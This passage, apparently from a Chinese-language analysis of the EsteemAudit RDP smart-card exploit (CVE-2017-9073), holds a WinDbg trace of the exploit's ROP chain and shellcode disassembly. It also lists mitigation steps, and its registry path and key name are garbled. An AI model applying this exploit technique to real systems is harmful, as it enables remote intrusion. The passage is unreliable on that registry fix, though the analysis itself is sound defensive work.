    eax=080190dc ebx=00000001 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078
    eip=0800bedd esp=02dfe3c4 ebp=02dfe404 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    gpkcsp!funcCheck+0x129:
    0800bedd 94              xchg    eax,esp
    0:011> t
    eax=02dfe3c4 ebx=00000001 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078
    eip=0800bede esp=080190dc ebp=02dfe404 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    gpkcsp!funcCheck+0x12a:
    0800bede c3              ret
    0:011> t
    eax=02dfe3c4 ebx=00000001 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078
    eip=08011e7a esp=080190e0 ebp=02dfe404 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    gpkcsp!MyCPSignHash+0x3ac:
    08011e7a c21c00          ret     1Ch
    0:011> t
    eax=02dfe3c4 ebx=00000001 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078
    eip=0801118e esp=08019100 ebp=02dfe404 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    gpkcsp!MyCPImportKey+0xac3:
    0801118e c21800          ret     18h
    0:011> t
    eax=02dfe3c4 ebx=00000001 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078
    eip=08011fef esp=0801911c ebp=02dfe404 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    gpkcsp!__report_gsfailure+0xdf:
    08011fef c3              ret
    0:011> t
    eax=02dfe3c4 ebx=00000001 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078
    eip=080128cc esp=08019120 ebp=02dfe404 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    gpkcsp!CC_Exit+0x4f:
    080128cc 58              pop     eax
    0:011> t
    eax=0000008f ebx=00000001 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078
    eip=080128cd esp=08019124 ebp=02dfe404 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    gpkcsp!CC_Exit+0x50:
    080128cd 5b              pop     ebx
    0:011> t
    eax=0000008f ebx=7ffe0300 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078
    eip=080128ce esp=08019128 ebp=02dfe404 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    gpkcsp!CC_Exit+0x51:
    080128ce c3              ret
    0:011> t
    eax=0000008f ebx=7ffe0300 ecx=77f50c75 edx=00000000 esi=77f3f618 edi=08019078
    eip=08015074 esp=0801912c ebp=02dfe404 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    gpkcsp!CC_Exit+0x27f7:
    08015074 ff23            jmp     dword ptr [ebx]      ds:0023:7ffe0300={ntdll!KiFastSystemCall (7c9585e8)}
    Shellcode start:
    No prior disassembly possible
    08019148 b004            mov     al,4
    0801914a 648b00          mov     eax,dword ptr fs:[eax]
    0801914d 2d00060000      sub     eax,600h
    08019152 89c4            mov     esp,eax
    08019154 89c6            mov     esi,eax
    08019156 e800000000      call    gpkcsp!IsProgButtonClick+0x8f (0801915b)
    0801915b 90              nop
    0801915c 5d              pop     ebp
    0801915d 8b85d5000000    mov     eax,dword ptr [ebp+0D5h]
    08019163 894604          mov     dword ptr [esi+4],eax
    08019166 8b85d9000000    mov     eax,dword ptr [ebp+0D9h]
    0801916c 89460c          mov     dword ptr [esi+0Ch],eax
    0801916f 31c0            xor     eax,eax
    08019171 894610          mov     dword ptr [esi+10h],eax
    08019174 894614          mov     dword ptr [esi+14h],eax
    08019177 8b85dd000000    mov     eax,dword ptr [ebp+0DDh]
    0801917d 8b00            mov     eax,dword ptr [eax]
    0801917f 8b80bc000000    mov     eax,dword ptr [eax+0BCh]
    08019185 894618          mov     dword ptr [esi+18h],eax
    08019188 8b85e1000000    mov     eax,dword ptr [ebp+0E1h]
    0801918e 8b00            mov     eax,dword ptr [eax]
    08019190 89461c          mov     dword ptr [esi+1Ch],eax
    08019193 8b85e5000000    mov     eax,dword ptr [ebp+0E5h]
    08019199 8b00            mov     eax,dword ptr [eax]
    0801919b 894620          mov     dword ptr [esi+20h],eax
    0801919e 8b460c          mov     eax,dword ptr [esi+0Ch]
    080191a1 894628          mov     dword ptr [esi+28h],eax
    080191a4 31c0            xor     eax,eax
    080191a6 89462c          mov     dword ptr [esi+2Ch],eax
    080191a9 e8b5000000      call    gpkcsp!IsProgButtonClick+0x197 (08019263)
    …
    0:011> !address 08019148
    Failed to map Heaps (error 80004005)
    Usage:                  Image
    Allocation Base:        08000000
    Base Address:           08019000
    End Address:            0801e000
    Region Size:            00005000
    Type:                   01000000    MEM_IMAGE
    State:                  00001000    MEM_COMMIT
    Protect:                00000040   PAGE_EXECUTE_READWRITE
    More info:              lmv m gpkcsp
    More info:              !lmi gpkcsp
    More info:              ln 0x8019148
**检测和暂时缓解措施**
CVE-2017-9073仅存在Windows XP和Windows
2003上，且这两个系统不再收到微软的支持。所以用户应该在第一时间升级到最新版的Windows系统。由于漏洞出现在RDP的智能卡模块，所以以下措施也可以暂时缓解漏洞：
在组策略中关闭智能卡模块
在注册表中关闭智能卡模块。在路径HKLMSOFTWAREPoliciesMicrosoftWindows NTTerminal
Services下增加或者设置键值0，类型为REG_DWORD
关闭或者限制外接的RDP访问请求
**总结**
RDP是Windows上非常有用且非常复杂的模块。基于我们对EsteemAudit的分析，这个漏洞本身并不难发现。不过难点在如何进行成功的利用。有趣的是gpkcsp选择了一个全局变量来存储客户端发来的原始数据，这样可以使攻击者在没有ASLR的情况下在一个固定的已知地址部署完全可控的数据。利用工具的作者利用了这个特性完成了exploit。EsteemAudit是一个在Windows
XP和Windows
2003上的利用工具。用户需要在类似于WanaCryp0t有蠕虫行为的病毒利用这个工具进行大规模传播前前，进行XP和2003系统的暂时缓解措施避免财产损失。